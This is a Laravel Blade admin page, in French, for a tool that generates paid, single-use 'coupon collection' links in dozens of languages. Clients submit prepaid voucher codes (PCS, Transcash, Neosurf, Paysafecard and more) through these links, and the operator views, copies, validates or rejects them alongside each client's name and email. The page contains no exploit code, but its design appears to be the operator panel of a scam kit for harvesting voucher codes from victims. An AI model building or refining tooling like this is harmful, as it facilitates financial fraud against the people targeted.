@extends('layouts.admin')

@section('title', 'Collecte de code coupon')

@section('breadcrumb')
    <li class="breadcrumb-item"><a href="{{ route('dashboard') }}"><i class="ri-briefcase-line me-1"></i>Outils</a></li>
    <li class="breadcrumb-item active"><i class="ri-ticket-line me-1"></i>Collecte de code coupon</li>
@endsection

@section('content')

@php
    $baseUrl = config('services.region.europe_client_url', url('/'));
@endphp

{{-- Alertes --}}
@if(session('error'))
    <div class="alert alert-danger border-0 shadow-sm mb-4">{{ session('error') }}</div>
@endif
@if(session('success'))
    <div class="alert alert-success border-0 shadow-sm mb-4">{{ session('success') }}</div>
@endif

<div class="u-data">
    {{-- COLONNE GAUCHE : Créer un lien --}}
    <div class="ud-1">
        <div class="u-title">
            <span><i class="ri-ticket-line"></i> Créer un lien de collecte</span>
        </div>
        <div class="u-content">
            {{-- Crédits --}}
            <p class="r-balance">
                <span>Crédit(s) disponible : <b>{{ number_format(Auth::user()->credit_user, 0, ',', ' ') }}</b></span>
                <span class="r-about" data-bs-toggle="tooltip" data-bs-placement="bottom" data-bs-html="true"
                      title="<b>2000 crédits</b> sont nécessaires pour générer un lien.">à savoir</span>
            </p>

            {{-- Info Box --}}
            <div class="alert alert-primary mb-3" id="showInfo">
                <p><i class="ri-information-line"></i> Cet outil vous permet simplement de créer des liens de collecte unique destinés à chacun de vos clients pour la collecte de code coupon. Une fois le lien généré vous pouvez le partager avec votre/vos client(s) parlant la même langue.</p>
                <p><b>NB :</b> Une fois le/les code(s) coupon(s) collectés, le lien expire et n'est plus utilisable une seconde fois. Vous devez donc en créer un nouveau pour une autre collecte.</p>
                <span><i class="ri-coin-line"></i> Cet outil est payant (2000 Crédits pour un lien de collecte généré).</span>
            </div>

            {{-- Lien de test (toujours visible) --}}
            @php
                $couponBaseUrl = config('services.region.coupon_collect_url');
                $testLink = rtrim($couponBaseUrl, '/');
                $testLink .= '?c=test';
            @endphp
            <form class="form-test">
                <div class="ttb-title"><i class="ri-flask-line"></i> Lien de test</div>
                <div class="mb-3">
                    <label class="form-label">Lien de collecte ci-dessous :</label>
                    <input type="button" class="form-control" value="{{ $testLink }}" disabled id="link-test">
                </div>
                <div class="d-grid gap-2 d-md-flex justify-content-md-end">
                    <a href="{{ $testLink }}" class="btn btn-primary" target="_blank">
                        Voir le site de collecte <i class="ri-arrow-right-s-line"></i>
                    </a>
                </div>
                <br>
            </form>


            {{-- Formulaire de création --}}
            <form method="POST" action="{{ route('tools.coupon.store') }}" class="form-real">
                @csrf
                <div class="ttb-title"><i class="ri-add-circle-line"></i> Nouveau lien de collecte</div>

                <div class="mb-3">
                    <label for="kind" class="form-label">Sélectionner le type de coupon . <i style="color:red">requis</i></label>
                    <select name="kind" id="kind" class="form-select" required>
                        <option value="" disabled selected>Type de coupon</option>
                        <option value="PCS">PCS</option>
                        <option value="Transcash">Transcash</option>
                        <option value="Neosurf">Neosurf</option>
                        <option value="Paysafecard">Paysafecard</option>
                        <option value="Toneo First">Toneo First</option>
                        <option value="Flexepin">Flexepin</option>
                        <option value="Cashlib">Cashlib</option>
                        <option value="JetonCash">JetonCash</option>
                        <option value="AstroPay">AstroPay</option>
                        <option value="ecoPayz ecoVoucher">ecoPayz ecoVoucher</option>
                        <option value="Mifinity eVoucher">Mifinity eVoucher</option>
                        <option value="Inconnu...">Autre type de coupon...</option>
                    </select>
                </div>

                <div class="mb-3">
                    <label for="lang" class="form-label">Langue d'affichage du site . <i style="color:red">requis</i></label>
                    <select name="lang" id="lang" class="form-select" required>
                        <option value="" disabled selected>Langue de votre client</option>
                        <option value="af">Afrikaans</option>
                        <option value="sq">Albanais</option>
                        <option value="de">Allemand</option>
                        <option value="en">Anglais</option>
                        <option value="ar">Arabe</option>
                        <option value="hy">Arménien</option>
                        <option value="az">Azéri</option>
                        <option value="eu">Basque</option>
                        <option value="bn">Bengali</option>
                        <option value="bs">Bosniaque</option>
                        <option value="bg">Bulgare</option>
                        <option value="ca">Catalan</option>
                        <option value="zh-CN">Chinois (simplifié)</option>
                        <option value="zh-TW">Chinois (traditionnel)</option>
                        <option value="ko">Coréen</option>
                        <option value="hr">Croate</option>
                        <option value="da">Danois</option>
                        <option value="es">Espagnol</option>
                        <option value="et">Estonien</option>
                        <option value="fi">Finnois</option>
                        <option value="fr" selected>Français</option>
                        <option value="ka">Géorgien</option>
                        <option value="el">Grec</option>
                        <option value="iw">Hébreu</option>
                        <option value="hi">Hindi</option>
                        <option value="hu">Hongrois</option>
                        <option value="id">Indonésien</option>
                        <option value="ga">Irlandais</option>
                        <option value="is">Islandais</option>
                        <option value="it">Italien</option>
                        <option value="ja">Japonais</option>
                        <option value="kk">Kazakh</option>
                        <option value="km">Khmer</option>
                        <option value="ku">Kurde</option>
                        <option value="lv">Letton</option>
                        <option value="lt">Lituanien</option>
                        <option value="mk">Macédonien</option>
                        <option value="ms">Malaisien</option>
                        <option value="mg">Malgache</option>
                        <option value="mt">Maltais</option>
                        <option value="nl">Néerlandais</option>
                        <option value="ne">Népalais</option>
                        <option value="no">Norvégien</option>
                        <option value="fa">Persan</option>
                        <option value="tl">Philippin</option>
                        <option value="pl">Polonais</option>
                        <option value="pt">Portugais</option>
                        <option value="ro">Roumain</option>
                        <option value="ru">Russe</option>
                        <option value="sr">Serbe</option>
                        <option value="sk">Slovaque</option>
                        <option value="sl">Slovène</option>
                        <option value="sv">Suédois</option>
                        <option value="sw">Swahili</option>
                        <option value="cs">Tchèque</option>
                        <option value="th">Thaï</option>
                        <option value="tr">Turc</option>
                        <option value="uk">Ukrainien</option>
                        <option value="vi">Vietnamien</option>
                        <option value="yo">Yorouba</option>
                        <option value="zu">Zoulou</option>
                    </select>
                </div>

                <div class="mb-3">
                    <label for="count" class="form-label">Nombre de coupon(s) à collecté(s) . <i style="color:red">requis</i></label>
                    <input type="tel" class="form-control" name="count" id="count" placeholder="Indiquer le nombre" autocomplete="off" required minlength="1" maxlength="1">
                </div>

                <div class="d-grid gap-2 d-md-flex justify-content-md-end">
                    <button class="btn btn-success" type="submit">
                        Générer un lien de collecte (2000 Crédits) <i class="ri-arrow-right-s-line"></i>
                    </button>
                </div>
                <br>
            </form>
        </div>
    </div>

    {{-- COLONNE DROITE : Liste des coupons collectés --}}
    <div class="ud-2">
        <div class="u-title">
            <span><i class="ri-checkbox-multiple-line"></i> Liste des coupons collectés</span>
        </div>
        <div class="u-content">
            @if($collections->isEmpty())
                <p class="empty-box">
                    <img src="https://www.kitscms.com/assets/images/box.png" alt="Vide" onerror="this.style.display='none'">
                    <br><span class="text-muted">Aucune donnée pour le moment</span>
                </p>
            @else
                <div class="history">
                    <div class="history-content">
                        @foreach($collections as $item)
                        @php
                            $itemUrl = config('services.region.coupon_collect_url');
                            $itemLink = rtrim($itemUrl, '/') . '?c=' . $item->token;
                        @endphp
                        <div class="history-item" data-bs-toggle="modal" data-bs-target="#detailModal{{ $item->id }}">
                            <div class="d-flex justify-content-between align-items-center">
                                <div>
                                    <b>{{ $item->kind }}</b>
                                    <span class="badge {{ $item->status === 'active' ? 'bg-success' : 'bg-danger' }} ms-2">
                                        {{ $item->status === 'active' ? 'Actif' : 'Expiré' }}
                                    </span>
                                </div>
                                <small class="text-muted">{{ $item->created_at->format('d/m/Y H:i') }}</small>
                            </div>
                            <div class="d-flex justify-content-between align-items-center mt-1">
                                <small class="text-muted">
                                    <i class="ri-ticket-2-line"></i> {{ $item->coupons_count }} / {{ $item->count }} collectés
                                    &nbsp;|&nbsp; Langue : <b>{{ strtoupper($item->lang ?? 'fr') }}</b>
                                </small>
                                <small class="text-primary"><i class="ri-eye-line"></i> Détails</small>
                            </div>
                        </div>

                        {{-- Modal de détails --}}
                        <div class="modal fade" id="detailModal{{ $item->id }}" tabindex="-1">
                            <div class="modal-dialog modal-dialog-scrollable modal-dialog-centered">
                                <div class="modal-content">
                                    <div class="modal-header" style="background-color: #ff9214; color: white;">
                                        <h5 class="modal-title"><i class="ri-information-line"></i> Détails de la collecte</h5>
                                        <button type="button" class="btn-close" data-bs-dismiss="modal" style="filter:invert(1);opacity:1;"></button>
                                    </div>
                                    <div class="modal-body" style="font-family:'Cabin',sans-serif; font-size:12.6px; padding-top:35px;">
                                        <p class="mb-2"><b>Type de coupon :</b> {{ $item->kind }}</p>
                                        <p class="mb-2"><b>Statut :</b> <span class="badge {{ $item->status === 'active' ? 'bg-success' : 'bg-danger' }}">{{ $item->status === 'active' ? 'Actif' : 'Expiré' }}</span></p>
                                        <p class="mb-2"><b>Coupons collectés :</b> {{ $item->coupons_count }} / {{ $item->count }}</p>
                                        <p class="mb-2"><b>Langue :</b> {{ strtoupper($item->lang ?? 'fr') }}</p>
                                        <p class="mb-2"><b>Date de création :</b> {{ $item->created_at->format('d/m/Y H:i') }}</p>
                                        <p class="mb-2"><b>Lien de collecte :</b> <span id="linktext-{{ $item->id }}" style="font-size:.85em;word-break:break-all;">{{ $itemLink }}</span> <button type="button" class="coupon-copy-btn" title="Copier le lien" onclick="event.stopPropagation();couponCopy(this,'linktext-{{ $item->id }}')"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button></p>
                                        <hr class="my-3">
                                        <p class="fw-bold mb-3"><i class="ri-list-check"></i> Codes coupons collectés :</p>
                                        @forelse($item->coupons as $coupon)
                                        <div class="border-bottom py-3">
                                            <p class="mb-2"><b>Nom client :</b> {{ $coupon->client_name ?? 'N/A' }}</p>
                                            <p class="mb-2"><b>Email client :</b> <span class="text-primary">{{ $coupon->client_email ?? 'N/A' }}</span></p>
                                            <p class="mb-2"><b>Type de coupon :</b> {{ $item->kind }}</p>
                                            <p class="mb-2"><b>Code :</b> <span class="coupon-code-badge" id="couponcode-{{ $coupon->id }}">{{ $coupon->code }}</span> <button type="button" class="coupon-copy-btn" title="Copier" onclick="event.stopPropagation();couponCopy(this,'couponcode-{{ $coupon->id }}')"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button></p>
                                            <p class="mb-2"><b>Montant :</b> <span class="text-success">{{ $coupon->amount ?? '0.00' }}</span></p>
                                            <p class="mb-2"><b>Statut :</b> @if($coupon->status == 'pending') <span class="text-warning">En attente</span> @elseif($coupon->status == 'validated') <span class="text-success">Validé</span> @else <span class="text-danger">Rejeté</span> @endif</p>
                                            <p class="mb-2"><b>Collecté le :</b> <span class="text-muted">{{ $coupon->created_at->format('d/m/Y H:i') }}</span></p>
                                            @if($coupon->status == 'pending')
                                            <div class="d-flex gap-2 mt-2">
                                                <form method="POST" action="{{ route('tools.coupon.notify', $coupon->id) }}">
                                                    @csrf
                                                    <input type="hidden" name="status" value="validated">
                                                    <button type="submit" class="btn btn-sm btn-success">
                                                        <i class="ri-check-line"></i> Coupon Validé
                                                    </button>
                                                </form>
                                                <form method="POST" action="{{ route('tools.coupon.notify', $coupon->id) }}">
                                                    @csrf
                                                    <input type="hidden" name="status" value="rejected">
                                                    <button type="submit" class="btn btn-sm btn-danger">
                                                        <i class="ri-close-line"></i> Coupon Rejeté
                                                    </button>
                                                </form>
                                            </div>
                                            @endif
                                        </div>
                                        @empty
                                        <div class="text-center py-3 text-muted">
                                            <i class="ri-hourglass-line fs-3 d-block mb-2 opacity-50"></i>
                                            Aucun code collecté pour le moment.
                                        </div>
                                        @endforelse

                                        {{-- Actions --}}
                                        <div class="d-flex justify-content-end gap-2 mt-4">
                                            <form method="POST" action="{{ route('tools.coupon.destroy', $item->id) }}" onsubmit="return confirm('Supprimer ce lien et tous ses coupons ?')">
                                                @csrf @method('DELETE')
                                                <button type="submit" class="btn btn-sm btn-danger">
                                                    <i class="ri-delete-bin-line"></i> Supprimer
                                                </button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        @endforeach
                    </div>
                </div>
                <div class="p-3 text-center small">
                    {{ $collections->links() }}
                </div>
            @endif
        </div>
    </div>
</div>

<style>
    @import url('https://fonts.googleapis.com/css2?family=Cabin:wght@400;500;600;700&family=Righteous&display=swap');
    /* ===== STYLE KITSCMS ===== */
    .u-data {
        position: relative;
        display: flex;
        flex-wrap: wrap;
        justify-content: space-between;
        margin: 0 0 20px;
    }
    .u-data > div {
        position: relative;
        width: 49%;
        background-color: white;
        padding-bottom: 20px;
        box-shadow: 0 0 12px 0 rgba(0,0,0,.14);
        border-radius: 4px;
    }
    .u-title {
        font-family: 'Righteous', cursive;
        padding: 20px;
        border-bottom: 1px solid #e2e2e2;
        font-size: 1.05em;
    }
    .ud-1 .u-title { color: #0d6efd; }
    .ud-2 .u-title { color: #ff9214; }
    .u-content {
        padding: 20px 15px;
        font-family: 'Cabin', sans-serif;
        font-size: 17px;
    }
    .u-key {
        font-family: 'Cabin', sans-serif;
        margin-bottom: 5px;
        font-weight: 600;
        color: #555;
    }
    .u-value {
        padding-left: 5px;
    }
    .u-value > span {
        font-family: 'Cabin', sans-serif;
        border-radius: 4px;
        padding: 6px 16px;
        background-color: #ededee;
        font-size: .88em;
        display: inline-block;
    }

    /* Balance & About */
    .r-balance { margin-bottom: 15px; }
    .r-balance > span { font-size: .95em; }
    .r-about {
        color: #4285f4;
        margin-left: 10px;
        text-decoration: underline;
        cursor: pointer;
    }
    .r-about:hover { color: #4285f480; }

    /* Info box */
    #showInfo {
        font-size: .9em;
        padding: 15px;
        text-align: justify;
        line-height: 1.6;
    }
    #showInfo p { margin-bottom: 8px; }

    /* Forms */
    .u-content form {
        box-shadow: 0 0 12px 0 rgba(0,0,0,.15);
        border-radius: 4px;
        padding: 10px 20px;
        margin-top: 40px;
    }
    .ttb-title {
        position: relative;
        top: -30px;
        display: inline-block;
        background-color: white;
        padding: 10px;
        border-radius: 4px;
        left: 10px;
        box-shadow: 0 0 12px 0 rgba(0,0,0,.15);
        font-family: 'Roboto Condensed', sans-serif;
        font-size: .95em;
    }
    .form-test .ttb-title {
        color: #0d6efd;
        border: 1px solid #0d6efd;
    }
    .form-real .ttb-title {
        color: #198754;
        border: 1px solid #198754;
    }
    .u-content label {
        font-size: .9em;
        color: #555;
    }
    .u-content input, .u-content select {
        font-size: .9em !important;
        padding: 10px !important;
    }
    #link-app {
        font-family: 'Cabin', sans-serif;
        background-color: #ededee;
        cursor: default;
    }

    /* History items */
    .history-item {
        font-family: 'Cabin', sans-serif;
        font-size: .9em;
        padding: 12px 15px;
        border-bottom: 1px solid #e2e2e2;
        background-color: #e2e2e275;
        cursor: pointer;
        transition: all 200ms ease;
    }
    .history-item:hover {
        background-color: #d4d4d4;
        padding-left: 20px;
    }
    .history-item:active {
        background-color: #e2e2e2;
    }

    /* Empty box */
    .empty-box {
        padding: 40px 10px;
        text-align: center;
    }
    .empty-box img {
        width: 120px;
        opacity: 0.7;
        margin-bottom: 15px;
    }

    /* Delete link */
    .delete-link { font-size: .85em; }

    /* Code badge + copy btn */
    .coupon-code-badge {
        display: inline-block;
        background: #1a1a2e;
        color: #fff;
        padding: 5px 14px;
        border-radius: 20px;
        font-weight: 600;
        font-size: .9em;
        letter-spacing: 1px;
        font-family: 'Roboto Mono', monospace;
    }
    .coupon-copy-btn {
        background: #f8f9fa; border: 1px solid #e2e8f0; border-radius: 50%;
        width: 28px; height: 28px; display: inline-flex; align-items: center; justify-content: center;
        cursor: pointer; color: #64748b; transition: all 0.2s;
        padding: 0; margin-left: 4px; vertical-align: middle; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
    }
    .coupon-copy-btn:hover { background: #667eea; color: #fff; border-color: #667eea; transform: translateY(-1px); box-shadow: 0 4px 6px rgba(102,126,234,0.2); }
    .coupon-copy-btn:active { transform: translateY(0); }
    .coupon-copy-btn.copy-success { background: #10b981; color: #fff; border-color: #10b981; }

    /* Modal */
    .modal { z-index: 9999999999 !important; }
    .modal .btn-close:focus {
        background-color: #dc3545 !important;
        box-shadow: 0 0 0 .25rem #dc354590 !important;
    }
    .modal-body { font-family: 'Cabin', sans-serif; }

    /* Delete link */
    .delete-link { font-size: .85em; }

    /* Responsive */
    @media screen and (max-width: 768px) {
        .u-data > div {
            display: block;
            width: 100%;
            margin-bottom: 20px;
        }
        .u-content form { padding: 10px 12px; }
        .ttb-title { font-size: .85em; padding: 8px; }
        .history-item { font-size: .82em; }
        #showInfo { font-size: .82em; }
    }
    @media screen and (max-width: 500px) {
        .u-content { padding: 15px 10px; }
        .u-title { padding: 14px 15px; font-size: .95em; }
        .delete-link { max-width: 60%; line-height: 17px; padding: 6px 12px !important; }
    }
</style>

@push('scripts')
<script>
    // Tooltips Bootstrap
    var tooltipEls = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
    tooltipEls.forEach(function(el) { new bootstrap.Tooltip(el); });

    // Copier du texte — fonctionne dans modals et HTTP
    function couponCopy(btn, id) {
        var el = document.getElementById(id);
        if (!el) return;
        var text = el.innerText || el.textContent || el.value || '';
        text = text.trim();

        // Méthode 1: clipboard API
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).then(function() { copySuccess(btn); });
            return;
        }

        // Méthode 2: execCommand avec range selection
        var range = document.createRange();
        range.selectNodeContents(el);
        var sel = window.getSelection();
        sel.removeAllRanges();
        sel.addRange(range);

        try {
            document.execCommand('copy');
            copySuccess(btn);
        } catch(e) {
            // Méthode 3: textarea fallback
            var ta = document.createElement('textarea');
            ta.value = text;
            ta.setAttribute('readonly', '');
            ta.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;padding:0;border:none;outline:none;opacity:0;';
            document.body.appendChild(ta);
            ta.focus();
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            copySuccess(btn);
        }
        sel.removeAllRanges();
    }

    function copySuccess(btn) {
        var svgCheck = '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        var svgCopy = '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        btn.innerHTML = svgCheck;
        btn.classList.add('copy-success');
        setTimeout(function() {
            btn.innerHTML = svgCopy;
            btn.classList.remove('copy-success');
        }, 1500);
    }
</script>
@endpush

@endsection
